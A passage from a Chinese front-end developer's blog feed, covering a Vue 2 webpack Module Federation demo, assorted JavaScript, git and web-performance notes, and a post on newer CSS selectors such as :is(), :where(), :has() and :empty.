class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">publicPath</span>: <span class="string">&#x27;http://localhost:8084/&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">chainWebpack</span>: <span class="function">(<span class="params">config</span>) =&gt;</span> &#123;</span><br><span class="line">    config</span><br><span class="line">      .<span class="title function_">plugin</span>(<span class="string">&#x27;module-federation-plugin&#x27;</span>)</span><br><span class="line">      .<span class="title function_">use</span>(<span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>).<span class="property">container</span>.<span class="property">ModuleFederationPlugin</span>, [&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;home&quot;</span>, <span class="comment">// 模块名称</span></span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&quot;remoteEntry.js&quot;</span>,</span><br><span class="line">        <span class="attr">exposes</span>: &#123; <span class="comment">// 对外暴露的组件</span></span><br><span class="line">          <span class="string">&#x27;./HelloWorld&#x27;</span>: <span class="string">&#x27;./src/components/HelloWorld.vue&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;])</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8084</span>,</span><br><span class="line">    <span class="attr">hot</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Methods&quot;</span>: <span class="string">&quot;GET, POST, PUT, DELETE, PATCH, OPTIONS&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Headers&quot;</span>:</span><br><span class="line">        <span class="string">&quot;X-Requested-With, content-type, Authorization&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="app-项目"><a href="#app-项目" class="headerlink" title="app 项目"></a>app 项目</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">publicPath</span>: <span class="string">&#x27;http://localhost:8085/&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">chainWebpack</span>: <span class="function">(<span class="params">config</span>) =&gt;</span> &#123;</span><br><span class="line">    config</span><br><span class="line">      .<span class="title function_">plugin</span>(<span class="string">&#x27;module-federation-plugin&#x27;</span>)</span><br><span class="line">      .<span class="title function_">use</span>(<span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>).<span class="property">container</span>.<span class="property">ModuleFederationPlugin</span>, [&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;app&quot;</span>,</span><br><span class="line">        <span class="attr">remotes</span>: &#123; <span class="comment">// 导入</span></span><br><span class="line">          <span class="attr">home</span>: <span class="string">&#x27;home@http://localhost:8084/remoteEntry.js&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;])</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8085</span>,</span><br><span class="line">    <span class="attr">hot</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Methods&quot;</span>: <span class="string">&quot;GET, POST, PUT, DELETE, PATCH, OPTIONS&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Headers&quot;</span>:</span><br><span class="line">        <span class="string">&quot;X-Requested-With, content-type, Authorization&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 使用 home 项目里面的组件</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">HelloWorld</span> <span class="attr">msg</span>=<span class="string">&quot;1111&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">HelloWorld</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;home/HelloWorld&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#app</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-family</span>: Avenir, Helvetica, Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">  -webkit-<span class="attribute">font-smoothing</span>: antialiased;</span></span><br><span class="line"><span class="language-css">  -moz-osx-<span class="attribute">font-smoothing</span>: grayscale;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p><a href="https://github.com/zch233/vue2-module-federation-demo">体验地址</a></p><blockquote><p>cd home &amp;&amp; yarn &amp;&amp; yarn serve<br>cd app &amp;&amp; yarn &amp;&amp; yarn serve</p></blockquote><blockquote><p>Q: 报错：Reason: ScriptExternalLoadError: Loading script failed.(missing: <a href="http://localhost:8084/remoteEntry.js">http://localhost:8084/remoteEntry.js</a>)</p><p>A：<br>  <figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chainWebpack: <span class="function"><span class="params">(config)</span> =&gt;</span> &#123;</span><br><span class="line">    config.optimization.<span class="keyword">delete</span>(<span class="string">&#x27;splitChunks&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常杂疑</title>
      <link href="/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/"/>
      <url>/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/</url>
      
        <content type="html"><![CDATA[<h3 id="1-二进制以-0b-开头，八进制以-0-开头-注意事项：var-phone-01032878-存电话号码时，会被js误认为八进制数字，所以会出现-‘bug’-，16进制以-0x-开头"><a href="#1-二进制以-0b-开头，八进制以-0-开头-注意事项：var-phone-01032878-存电话号码时，会被js误认为八进制数字，所以会出现-‘bug’-，16进制以-0x-开头" class="headerlink" title="1.二进制以 0b 开头，八进制以 0 开头(注意事项：var phone = 01032878 存电话号码时，会被js误认为八进制数字，所以会出现 ‘bug’) ，16进制以 0x 开头"></a>1.二进制以 <code>0b</code> 开头，八进制以 <code>0</code> 开头(<em>注意事项：<code>var phone = 01032878</code> 存电话号码时，会被js误认为八进制数字，所以会出现 <strong>‘bug’</strong></em>) ，16进制以 <code>0x</code> 开头</h3><h3 id="2-css-之间的影响："><a href="#2-css-之间的影响：" class="headerlink" title="2.css 之间的影响："></a>2.css 之间的影响：<img src="/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/img.png"></h3><h3 id="3-vue组件中-data-为什么是一个函数？"><a href="#3-vue组件中-data-为什么是一个函数？" class="headerlink" title="3.vue组件中 data 为什么是一个函数？"></a>3.vue组件中 data 为什么是一个函数？</h3><blockquote><p>为什么组件中的 data 必须是一个函数，然后 return 一个对象，而 new Vue 实例里，data 可以直接是一个对象？</p></blockquote><p>因为组件是用来复用的，且 JS 里对象是引用关系，如果组件中 data 是一个对象，那么这样作用域没有隔离，子组件中的 data 属性值会相互影响，如果组件中 data 选项是一个函数，那么每个实例可以维护一份被返回对象的独立的拷贝，组件实例之间的 data 属性值不会互相影响；而 new Vue 的实例，是不会被复用的，因此不存在引用对象的问题。</p><h3 id="4-module-exports和export"><a href="#4-module-exports和export" class="headerlink" title="4.module.exports和export"></a>4.module.exports和export</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"><span class="comment">// ex1:</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">verifyPassword</span> = <span class="keyword">function</span>(<span class="params">user, password, done</span>) &#123; ... &#125;</span><br><span class="line"><span class="comment">// ex2:</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">verifyPassword</span> = <span class="keyword">function</span>(<span class="params">user, password, done</span>) &#123; ... &#125;</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> b.js</span><br><span class="line"><span class="regexp">//</span> ex1:</span><br><span class="line">require(‘a.js’) <span class="regexp">//</span> &#123; verifyPassword: <span class="keyword">function</span>(user, password, done) &#123; ... &#125; &#125; </span><br><span class="line"><span class="regexp">//</span> ex2:</span><br><span class="line">require(‘a.js’) <span class="regexp">//</span> verifyPassword: <span class="keyword">function</span>(user, password, done) &#123; ... &#125;</span><br></pre></td></tr></table></figure><h3 id="5-git"><a href="#5-git" class="headerlink" title="5.git"></a>5.git</h3><p>git commit –amend 修改上次的 commit message<br>git rebase -i 想修改的 commit 的父亲的 commit  进入 rebase 中， 可以修改commit message 也可以合并commit （s 合并commit ，r 修改message）<br>git diff 比较工作区与暂存区之前的差异，git diff –cached 比较暂存区和HEAD之间的差异<br>git reset HEAD 将暂存区的所有变动恢复到工作区(也就是取消git add .)<br>git reset –hard commit码 （回退到哪个版本）</p><h3 id="6-BEM"><a href="#6-BEM" class="headerlink" title="6.BEM"></a>6.BEM</h3><p><img src="/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/img_1.png"></p><h3 id="7-在github上面搜索小技巧"><a href="#7-在github上面搜索小技巧" class="headerlink" title="7. 在github上面搜索小技巧"></a>7. 在github上面搜索小技巧</h3><p><img src="/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/img_2.png" alt="in:readme"></p><h3 id="8-简洁的滚动条-css"><a href="#8-简洁的滚动条-css" class="headerlink" title="8. 简洁的滚动条 css"></a>8. 简洁的滚动条 css</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">::-webkit-scrollbar &#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">28px</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">::-webkit-scrollbar-thumb &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">50</span>,<span class="number">50</span>,<span class="number">51</span>,.<span class="number">15</span>);</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><h3 id="10-JSONP"><a href="#10-JSONP" class="headerlink" title="10.JSONP"></a>10.JSONP</h3><p><img src="/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/img_3.png"></p><h3 id="11-node重点API"><a href="#11-node重点API" class="headerlink" title="11.node重点API"></a>11.node重点API</h3><p><img src="/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/img_4.png"></p><h3 id="12-原型链"><a href="#12-原型链" class="headerlink" title="12. 原型链"></a>12. 原型链</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为不能写</span></span><br><span class="line"><span class="title class_">Man</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = <span class="title class_">Human</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="comment">// 所以只能用下面三句话代替</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125; <span class="comment">// 为了过滤this上的私有属性，因为我们不想要下图的第四步</span></span><br><span class="line">fn.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Human</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="title class_">Man</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">fn</span>() <span class="comment">// 如下图 Man.prototype.__proto__ = fn.prototype // 一个东西的__proto__等于构造出他的prototype</span></span><br></pre></td></tr></table></figure><p><img src="/Blog/2021/06/18/essay/%E6%97%A5%E5%B8%B8%E6%9D%82%E7%96%91/index/img_5.png"></p><h3 id="13-web性能优化"><a href="#13-web性能优化" class="headerlink" title="13.web性能优化"></a>13.web性能优化</h3><p>首先来分析从用户输入网址到看到页面发生了什么？</p><blockquote><p>1.看有无缓存，有缓存就读缓存，无缓存就接下来继续。<br>2.DNS查询<br>3.建立TCP连接，其中三次握手。<br>4.发送HTTP请求<br>5.后台处理请求<br>6.客户端接收响应<br>7.响应完成 （readyState &#x3D;&#x3D;&#x3D; 4）<br>8.解析HTML<br>9.并行下载CSS，串行解析CSS（chrome中会等CSS解析完成才显示页面，所以在chrome中CSS也会阻塞渲染）<br>10.并行下载JS，串行解析JS</p></blockquote><p>所以web优化，也从上述步骤中突破。</p><blockquote><p>1.设置缓存。<br>2.减少域名请求数量（减少cdn之类的请求）。<br>3.TCP连接复用（keep-alive）如果是HTTP2.0有个多路复用。<br>4.HTTP请求4部分，我们可以优化第二部分，删除不需要的cookie，还可以增加cache-control等。还可以通过同时发送多个请求来减少时间（同一域名下浏览器会帮我们，IE四个、chrome八个，所以可以用多个域名来存我们的css、js静态文件，但是这里和第二步冲突，所以需要权衡，文件少的时候没有突破浏览器同时发送上限，我们就直接放在一个域名下即可，文件多的话就相反）。<br>5.后台的事情。<br>6.可以设置ETag，直接返回304，没有响应体。还可以设置Gzip，压缩文件。<br>7.无<br>8.HTML的DOCTYPE（html&#x2F;XML）不能写错，也不能不写<br>9.放cdn<br>10.放cdn</p></blockquote><h3 id="14-javascript-如何导入没有TypeScript定义的npm软件包"><a href="#14-javascript-如何导入没有TypeScript定义的npm软件包" class="headerlink" title="14.javascript - 如何导入没有TypeScript定义的npm软件包"></a>14.javascript - 如何导入没有TypeScript定义的npm软件包</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">GoogleMapLoader</span>, <span class="title class_">GoogleMap</span>, <span class="title class_">Marker</span>&#125; <span class="keyword">from</span> <span class="string">&quot;react-google-maps&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;react-google-maps&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">var</span> <span class="title class_">GoogleMapLoader</span>:<span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// or</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&#x27;react-loadable&#x27;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">classes</span>: <span class="built_in">any</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> classes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你可能还不知道的 CSS 特性</title>
      <link href="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/"/>
      <url>/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/</url>
      
        <content type="html"><![CDATA[<h2 id="1-is-和-where"><a href="#1-is-和-where" class="headerlink" title="1. :is() 和 :where()"></a>1. <code>:is()</code> 和 <code>:where()</code></h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:is</span>(<span class="selector-class">.header</span>, <span class="selector-class">.main</span>) <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-pseudo">:where</span>(<span class="selector-class">.header</span>, <span class="selector-class">.main</span>) <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这两个选择器等同于：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.header</span> <span class="selector-tag">p</span>, <span class="selector-class">.main</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.header</span> <span class="selector-tag">p</span>, <span class="selector-class">.main</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他们唯一不同之处，就是选择器<strong>权重</strong>不同。等同于以：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* :is */</span></span><br><span class="line"><span class="selector-class">.header</span> <span class="selector-tag">p</span>, <span class="selector-class">.main</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* :where */</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🌰：一般可以用来简写一些选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.div1</span> <span class="selector-tag">p</span>, <span class="selector-class">.div2</span> <span class="selector-tag">p</span> <span class="selector-class">.div3</span> <span class="selector-tag">p</span> &#123;&#125;</span><br><span class="line"><span class="comment">/* 简写 */</span></span><br><span class="line"><span class="selector-pseudo">:is</span>(<span class="selector-class">.div1</span>, <span class="selector-class">.div2</span>, <span class="selector-class">.div3</span>) <span class="selector-tag">p</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="2-not-和-has"><a href="#2-not-和-has" class="headerlink" title="2. :not() 和 :has()"></a>2. <code>:not()</code> 和 <code>:has()</code></h2><p>🌰：有时候可以更有语义化一点表示下图需求：</p><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img.png"></p><p>在没有 <code>:not()</code> 选择器的时候，你可能会想到下面这样的方式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.card</span> + <span class="selector-class">.card</span> &#123; <span class="comment">/* 没用过的看不懂 */</span></span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 或 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.card</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.card</span><span class="selector-pseudo">:last-child</span> &#123; <span class="comment">/* 需要拆成了两行来写 */</span></span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果换成 <code>:not()</code> 选择器，可以这要来实现：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.card</span><span class="selector-pseudo">:not</span>(<span class="selector-pseudo">:last-child</span>) &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然 CSS 选择器已经非常强大了，但一直以来，在 CSS 中没有从子元素选到父元素的样的选择器（父选择器）：</p><p>即将到来的 <code>:has()</code> 选择器它可以用来选择父级元素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span> <span class="comment">&lt;!-- section 边框颜色是 blue --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>H1 Level Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span> <span class="comment">&lt;!-- section 边框颜色是 red --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>H2 Level Title<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">section</span><span class="selector-pseudo">:has</span>(<span class="selector-tag">h1</span>) &#123;</span><br><span class="line">  <span class="attribute">border-color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">section</span><span class="selector-pseudo">:has</span>(<span class="selector-tag">h2</span>) &#123;</span><br><span class="line">  <span class="attribute">border-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🌰：可能根据子元素的变化，改变父元素的样式，而不必再给父元素添加额外的 class</p><h2 id="3-empty-和-blank"><a href="#3-empty-和-blank" class="headerlink" title="3. :empty 和 :blank"></a>3. <code>:empty</code> 和 <code>:blank</code></h2><p>🌰：有时候数据为空时，如下图这样：</p><p><img src="/Blog/2021/06/18/essay/%E4%BD%A0%E5%8F%AF%E8%83%BD%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84CSS%E7%89%B9%E6%80%A7/index/img_1.png"></p><p>此时我们还要额外隐藏容器，要是有了表示空状态的伪类选择器就可以直接这么写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">section</span><span class="selector-pseudo">:empty</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none; <span class="comment">/* or others */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是 <code>:empty</code> 只能选中没有子元素的元素。子元素只可以是元素节点或文本（包括空格）。注释或处理指令都不会产生影响。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 空元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="comment">&lt;!-- 注释 --&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error pseudo-elements(伪元素)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 非空元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="comment">&lt;!-- 中间有一个空格符 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="comment">&lt;!-- 断行 